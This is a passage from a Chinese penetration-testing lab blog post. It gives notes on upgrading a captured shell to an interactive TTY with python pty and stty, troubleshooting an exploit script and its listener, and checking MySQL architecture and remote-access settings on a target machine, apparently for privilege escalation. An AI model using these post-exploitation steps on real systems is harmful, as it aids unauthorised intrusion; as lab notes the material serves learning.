+<h4 id="mysql查看当前用户">MySQL查看当前用户</h4>
+<pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>();
+<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">CURRENT_USER</span>();</code></pre>
+<h4 id="升级完整性交互式shell"><a target="_blank" rel="noopener" href="https://www.cnblogs.com/aaak/p/14067593.html">升级完整性交互式shell</a></h4>
+<pre><code class="hljs routeros">[root@localhost ~]# python -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>   #使用python回显标头
+[root@localhost ~]# ^Z		      # ctrl + z 按键  挂起正在运行的程序 
+root@kali64:~# stty<span class="hljs-built_in"> raw </span>-echo	      # 输入这句后 在输入命令终端不在显示 
+root@kali64:~# fg		      # 把后台挂起的程序，放到控制台----》 终端不显示命令，输入后回车
+[root@localhost ~]# reset   # 将终端恢复至原始状态，之前的终端输入操作信息将都会被清空
+[root@localhost ~]# <span class="hljs-builtin-name">export</span> <span class="hljs-attribute">SHELL</span>=bash</code></pre>
+<h4 id="linux快速开启http">linux快速开启http</h4>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zr1213159840/article/details/123671790?spm=1001.2101.3001.6650.12&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-12-123671790-blog-107928557.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-12-123671790-blog-107928557.pc_relevant_default&amp;utm_relevant_index=16">kali中搭建简单http服务的四种方法（其中几种在其他linux中也适用）</a></p>
+<h2 id="出现的问题">出现的问题</h2>
+<h3 id="py模块下载问题">py模块下载问题</h3>
+<p>本地win10运行exp的py文件时显示没有模块，下载模块又报错</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520172026202.png" srcset="/img/loading.gif" alt="image-20220520172026202"></p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520172038141.png" srcset="/img/loading.gif" alt="image-20220520172038141"></p>
+<p>谷歌发现是开代理的原因，把win代理关了就ok了</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220520172113784.png" srcset="/img/loading.gif" alt="image-20220520172113784"></p>
+<h3 id="win10问题">win10问题</h3>
+<p>运行exp后监听端口没收到，估计是要开放win10端口，为了安全起见还是不开了，转去kali好了</p>
+<blockquote>
+<p>win10 开启端口：https://www.jianshu.com/p/11df41ddfcdb</p>
+<p>Win10
+开放防火墙中某一端口：https://blog.csdn.net/nihaize0520/article/details/80714108</p>
+</blockquote>
+<h3 id="开放了端口为什么nmap扫不到呢">开放了端口，为什么nmap扫不到呢？</h3>
+<p>只有端口使用时nmap才扫得到</p>
+<h3 id="位64位">32位？64位?</h3>
+<p>mysql如何查看是32位还是64位？</p>
+<pre><code class="hljs sql">mysql -V或mysql <span class="hljs-comment">--version</span>
+进入mysql,输入命令：<span class="hljs-keyword">show</span> <span class="hljs-keyword">variables</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%version_%&#x27;</span>;
+或<span class="hljs-keyword">show</span> <span class="hljs-keyword">variables</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%compile%&#x27;</span>;</code></pre>
+<p>X64 表示64位</p>
+<p>X86 表示32位</p>
+<p>只带有win32.x86字样的是32位，带有win32.x86_64字样的是64位的。</p>
+<p>这里看出是64位的，应该用64位的so文件</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522103007475.png" srcset="/img/loading.gif" alt="image-20220522103007475"></p>
+<blockquote>
+<p>Win32 -&gt; 指的就是Windows系统； 64 bit- &gt;
+指的是Windows是64位的； AMD64 -&gt; 指的就是 CPU是x64的</p>
+</blockquote>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522104007503.png" srcset="/img/loading.gif" alt="image-20220522104007503" style="zoom: 67%;"></p>
+<h3 id="开启外连失败">开启外连失败？</h3>
+<p>https://blog.csdn.net/cj_Allen/article/details/104107013</p>
+<p><a target="_blank" rel="noopener" href="https://www.yisu.com/zixun/315246.html">如何解决远程连接mysql失败了的问题</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lemon-flm/p/7396536.html">Linux的netstat查看端口是否开放见解（0.0.0.0与127.0.0.1的区别）</a></p>
+<ol type="1">
+<li>需要确定<strong>防火墙没有阻止3306端口</strong>，否则是无法通过3306端口连接到myql的。</li>
+</ol>
+<p><code>netstat -ano |find "3306"</code> 可以看到local
+address是127.0.0.1:3306说明当前的连接只是针对服务器本身的，此时是未开启外连的，也就是说其他处于公网的ip无法通过<strong>mysql
+-h114.116.30.20 -uroot -p</strong>连接到当前数据库（图上红圈圈错了）</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522113733723.png" srcset="/img/loading.gif" alt="image-20220522113733723"></p>
+<p>==<strong>Local</strong>==：访问端口的方式，<span style="background:#FFDBBB;"><strong>0.0.0.0
+是对外开放端口，说明3306端口外面可以访问</strong>；127.0.0.1
+说明只能对本机访问，外面访问不了此端口；</span></p>
+<p><strong>Foregin Address</strong>：对外开放，一般都为0.0.0.0：*</p>
+<ol start="2" type="1">
+<li>3306被绑定到了本地。检查一下my.cnf的配置，这里可以配置绑定ip地址。</li>
+</ol>
+<pre><code class="hljs ini"><span class="hljs-attr">bind-address</span>=addr</code></pre>
+<p>不配置或者IP配置为0.0.0.0，表示监听所有客户端连接。如果是127.0.0.1：表示只能本地登录</p>
+<p>但是靶机这里，my.cnf，www-data是不能编辑的，只能read</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522154602082.png" srcset="/img/loading.gif" alt="image-20220522154602082" style="zoom:67%;"></p>
+<p>配置文件里已经写死了ip</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522154635082.png" srcset="/img/loading.gif" alt="image-20220522154635082" style="zoom:67%;"></p>
+<ol start="3" type="1">
+<li>检查MySQL用户权限：</li>
+</ol>
+<p>MySQL建用户的时候会指定一个host，默认是127.0.0.1/localhost，那么这个用户就只能本机访问，其它机器用这个用户帐号访问会提示没有权限，host改为%，表示允许所有机器访问。</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/image-20220522155317424.png" srcset="/img/loading.gif" alt="image-20220522155317424" style="zoom: 67%;"></p>
+<p><em>要想外连，需三个条件同时满足才行，这里只能满足3，所以不能外连</em></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">靶场练习</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/03/29/buu/">
+                        <span class="hidden-mobile">BUUCTF web刷题记录 WP</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/Romanc9" target="_blank" rel="nofollow noopener"><span>Luoman</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
